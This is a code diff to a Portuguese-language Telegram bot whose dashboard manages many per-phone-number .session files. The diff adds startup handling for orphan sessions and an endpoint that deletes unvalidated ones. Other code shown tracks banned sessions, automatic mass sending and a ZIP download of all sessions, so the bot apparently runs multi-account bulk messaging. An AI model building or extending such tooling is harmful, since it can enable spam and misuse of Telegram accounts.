@@ -759,7 +759,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )]
     ]
 
-    with open(os.path.join(BASE_DIR, "cvcuck.mp4"), "rb") as video:
+    with open(os.path.join(BASE_DIR, "video.mp4"), "rb") as video:
         await update.message.reply_video(
             video=video,
             caption=(
@@ -924,11 +924,19 @@ async def carregar_sessoes():
     print(f"[STARTUP] 📂 {len(arquivos)} sessão(ões) encontrada(s), carregando...")
 
     if not disparo_automatico_ativo():
+        mantidas = 0
+        orfas = 0
         for arquivo in arquivos:
             phone = arquivo.replace(".session", "")
+            if phone not in session_stats:
+                orfas += 1
+                print(f"[STARTUP] Sessao orfa ignorada: {phone}")
+                continue
             init_session_stats(phone)
-        save_stats()
-        print(f"[STARTUP] Disparo automatico desativado; {len(arquivos)} sessao(oes) mantida(s) sem envio.")
+            mantidas += 1
+        if mantidas:
+            save_stats()
+        print(f"[STARTUP] Disparo automatico desativado; {mantidas} sessao(oes) mantida(s), {orfas} orfa(s) ignorada(s).")
         return
 
     for arquivo in arquivos:
@@ -1220,6 +1228,31 @@ async def api_dashboard_cleanup(request):
     print(f"[CLEANUP] 🧹 {removed} sessões banidas removidas")
     return web.json_response({"ok": True, "removed": removed})
 
+async def api_dashboard_cleanup_unvalidated(request):
+    """Remove sessões sem identidade confirmada e sem validação válida."""
+    token = request.query.get("token", "")
+    if token != DASHBOARD_TOKEN:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    removable_statuses = {"unknown", "error", "missing"}
+    to_remove = [
+        phone
+        for phone, s in session_stats.items()
+        if not s.get("account_id") and s.get("validation_status", "unknown") in removable_statuses
+    ]
+
+    removed = 0
+    for phone in to_remove:
+        session_stats.pop(phone, None)
+        session_file = os.path.join(SESSIONS_DIR, f"{phone}.session")
+        if os.path.exists(session_file):
+            os.remove(session_file)
+        removed += 1
+
+    save_stats()
+    print(f"[CLEANUP] 🧹 {removed} sessões não validadas removidas")
+    return web.json_response({"ok": True, "removed": removed})
+
 async def api_dashboard_download_sessions(request):
     """Gera um ZIP com todas as sessões .session e retorna para download"""
     token = request.query.get("token", "")
@@ -1354,6 +1387,7 @@ async def main():
     web_app.router.add_get("/api/dashboard", api_dashboard)
     web_app.router.add_get("/api/dashboard/logs", api_dashboard_logs)
     web_app.router.add_post("/api/dashboard/cleanup", api_dashboard_cleanup)
+    web_app.router.add_post("/api/dashboard/cleanup-unvalidated", api_dashboard_cleanup_unvalidated)
     web_app.router.add_post("/api/dashboard/validate-session", api_dashboard_validate_session)
     web_app.router.add_get("/api/dashboard/download-sessions", api_dashboard_download_sessions)
     web_app.router.add_post("/api/dashboard/connect-bot", api_connect_bot)
